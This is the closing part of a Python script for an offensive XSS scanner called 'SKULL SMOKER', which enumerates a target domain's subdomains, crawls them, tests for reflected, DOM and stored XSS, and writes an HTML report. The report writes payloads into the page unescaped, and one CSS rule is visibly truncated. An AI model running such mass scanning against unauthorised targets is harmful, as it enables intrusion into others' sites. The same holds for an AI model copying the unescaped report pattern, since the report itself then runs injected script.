                        padding-bottom: 8px;
                        margin-top: 40px;
                        font-size: 1.5rem;
                    }}
                    table {{
                        width: 100%;
                        border-collapse: collapse;
                        margin-top: 20px;
                        background: #181818;
                        border-radius: 8px;
                        overflow: hidden;
                        box-shadow: 0 1px 8px #0006;
                    }}
                    th, td {{
                        border: none;
                        padding: 14px 10px;
                        text-align: left;
                    }}
                    th {{
                        background: #263238;
                        color: #00e676;
                        font-size: 1.1rem;
                    }}
                    tr {{
                        border-bottom: 1px solid #333;
                    }}
                    tr:last-child {{
                        border-bottom: none;
                    }}
                    tr.critical {{ background: #3d1a1a; }}
                    tr.high {{ background: #2c2233; }}
                    tr.medium {{ background: #232526; }}
                    tr.low {{ background: #1a2c1a; }}
                    tr:hover {{ background: #333; }}
                    a {{ color: #00bcd4; text-decoration: underline; }}
                    .vulnerability {{
                        margin-bottom: 30px;
                        padding: 18px 22px;
                        border-radius: 10px;
                        border-left: 6px solid #00e676;
                        background: #181818;
                        box-shadow: 0 1px 8px #0006;
                    }}
                    .vulnerability.critical {{ border-color: #ff1744; }}
                    .vulnerability.high {{ border-color: #ff9100; }}
                    .vulnerability.medium {{ border-color: #00bcd4; }}
                    .
                        border: none;
                        outline: none;
                        width: 100%;
                        text-align: left;
                        margin-bottom: 8px;
                        transition: color 0.2s;
                    }}
                    .collapsible:hover {{ color: #ff1744; }}
                    .content {{
                        display: none;
                        padding-left: 10px;
                        margin-top: 8px;
                    }}
                    .payload {{
                        font-family: 'Fira Mono', monospace;
                        background: #222;
                        color: #ffeb3b;
                        padding: 8px 12px;
                        border-radius: 6px;
                        margin: 8px 0;
                        font-size: 1.05rem;
                        word-break: break-all;
                    }}
                    .context, .parameter {{
                        color: #bdbdbd;
                        font-size: 1rem;
                    }}
                    @media (max-width: 700px) {{
                        main {{ padding: 10px; }}
                        .stats {{ flex-direction: column; gap: 10px; }}
                    }}
                </style>
                <script>
                    function toggleCollapse(element) {{
                        var content = element.nextElementSibling;
                        if (content.style.display === "block") {{
                            content.style.display = "none";
                        }} else {{
                            content.style.display = "block";
                        }}
                    }}
                </script>
            </head>
            <body>
                <header>
                    <h1>SKULL SMOKER XSS REPORT</h1>
                    <h2>Target: {self.domain}</h2>
                    <p>Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
                </header>
                <div class="stats">
                    <div class="stat-box">
                        <h3>Total Vulnerabilities</h3>
                        <p>{len(self.vulnerabilities)}</p>
                    </div>
                    <div class="stat-box">
                        <h3>Critical</h3>
                        <p>{len([v for v in self.vulnerabilities if v.get('severity') == 'Critical'])}</p>
                    </div>
                    <div class="stat-box">
                        <h3>High</h3>
                        <p>{len([v for v in self.vulnerabilities if v.get('severity') == 'High'])}</p>
                    </div>
                    <div class="stat-box">
                        <h3>Medium</h3>
                        <p>{len([v for v in self.vulnerabilities if v.get('severity') == 'Medium'])}</p>
                    </div>
                </div>
                <main>
                    <h2 class="section-title">Vulnerabilities Overview</h2>
                    <table>
                        <tr>
                            <th>Type</th>
                            <th>Severity</th>
                            <th>URL</th>
                            <th>Parameter</th>
                        </tr>
                        {''.join([
                            f'<tr class="{vuln["severity"].lower()}">' +
                            f'<td>{vuln["type"]}</td>' +
                            f'<td>{vuln["severity"]}</td>' +
                            f'<td><a href="{vuln["url"]}" target="_blank">{vuln["url"]}</a></td>' +
                            f'<td>{vuln.get("parameter", "N/A")}</td>' +
                            '</tr>'
                            for vuln in self.vulnerabilities
                        ])}
                    </table>
                    <h2 class="section-title">Vulnerability Details</h2>
                    {''.join([
                        f'<div class="vulnerability {vuln["severity"].lower()}">' +
                        f'<button class="collapsible" onclick="toggleCollapse(this)">{vuln["type"]} - {vuln["severity"]}</button>' +
                        f'<div class="content">' +
                        f'<p class="context"><strong>URL:</strong> <a href="{vuln["url"]}" target="_blank">{vuln["url"]}</a></p>' +
                        (f'<p class="parameter"><strong>Parameter:</strong> {vuln["parameter"]}</p>' if "parameter" in vuln else "") +
                        f'<p><strong>Payload:</strong></p>' +
                        f'<div class="payload">{vuln["payload"]}</div>' +
                        (f'<p class="context"><strong>Context:</strong> {vuln["context"]}</p>' if "context" in vuln else "") +
                        '</div>' +
                        '</div>'
                        for vuln in self.vulnerabilities
                    ])}
                </main>
            </body>
            </html>
            """
            
            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write(template)
                
            self._print_status(f"Report saved to {self.output_file}", "success")
        except Exception as e:
            self._print_status(f"Error generating report: {str(e)}", "error")

    def run(self):
        """Main execution method"""
        print(BANNER)
        self._animate_text(f"Starting SKULL SMOKER against {self.domain}", Fore.RED)
        
        # Phase 1: Subdomain Enumeration
        self._print_status("Starting subdomain enumeration...", "info")
        
        # Get subdomains from multiple sources
        subdomains = set()
        subdomains.update(self._get_crtsh_subdomains())
        subdomains.update(self._get_dnsdumpster_subdomains())
        subdomains.update(self._get_otx_subdomains())
        subdomains.update(self._get_bufferover_subdomains())
        subdomains.update(self._get_rapiddns_subdomains())
        subdomains.update(self._get_threatcrowd_subdomains())
        subdomains.update(self._get_hackertarget_subdomains())
        subdomains.update(self._get_anubis_subdomains())
        subdomains.update(self._get_riddler_subdomains())
        subdomains.update(self._get_urlscan_subdomains())
        
        # Resolve subdomains to check if they're live
        self._print_status(f"Resolving {len(subdomains)} subdomains...", "info")
        self.subdomains = self._resolve_subdomains(subdomains)
        self._print_status(f"Found {len(self.subdomains)} live subdomains", "success")
        
        # Phase 2: URL Discovery
        self._print_status("Starting URL discovery...", "info")
        
        # Get URLs from Wayback Machine
        wayback_urls = self._get_wayback_urls()
        self.urls.update(wayback_urls)
        self._print_status(f"Found {len(wayback_urls)} historical URLs from Wayback Machine", "success")
        
        # Crawl each subdomain
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = []
            for subdomain in self.subdomains:
                futures.append(executor.submit(self._crawl_urls_selenium, f"http://{subdomain}"))
                futures.append(executor.submit(self._crawl_urls_selenium, f"https://{subdomain}"))
            
            for future in as_completed(futures):
                try:
                    found_urls = future.result()
                    self.urls.update(found_urls)
                except Exception as e:
                    self._print_status(f"Error during crawling: {str(e)}", "error")
        
        self._print_status(f"Total unique URLs discovered: {len(self.urls)}", "success")
        
        # Phase 3: XSS Testing
        self._print_status("Starting XSS vulnerability scanning...", "info")
        
        # Test each URL for vulnerabilities
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = []
            for url in self.urls:
                futures.append(executor.submit(self._test_reflected_xss, url))
                futures.append(executor.submit(self._test_dom_xss, url))
                futures.append(executor.submit(self._test_stored_xss, url))
            
            for future in as_completed(futures):
                try:
                    vulnerabilities = future.result()
                    with self.lock:
                        self.vulnerabilities.extend(vulnerabilities)
                except Exception as e:
                    self._print_status(f"Error during testing: {str(e)}", "error")
        
        # Phase 4: Reporting
        if self.vulnerabilities:
            self._print_status(f"Found {len(self.vulnerabilities)} XSS vulnerabilities!", "success")
            self._generate_html_report()
        else:
            self._print_status("No XSS vulnerabilities found.", "warning")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SKULL SMOKER - Ultimate XSS Recon & Exploitation Framework")
    parser.add_argument("domain", help="Target domain to scan")
    parser.add_argument("-o", "--output", help="Output file name (default: skull_report.html)", default="skull_report.html")
    parser.add_argument("--headless", help="Run browser in headless mode", action="store_true")
    parser.add_argument("-d", "--depth", help="Crawl depth (default: 2)", type=int, default=2)
    
    args = parser.parse_args()
    scanner = SkullSmoker(
        domain=args.domain,
        output_file=args.output,
        headless=args.headless,
        depth=args.depth
    )
    # Use glitch effect for banner
    scanner._animate_text(BANNER, Fore.RED, delay=0.002, glitch=True)
    scanner._animate_text(f"Starting SKULL SMOKER against {scanner.domain}", Fore.RED)
    scanner.run()
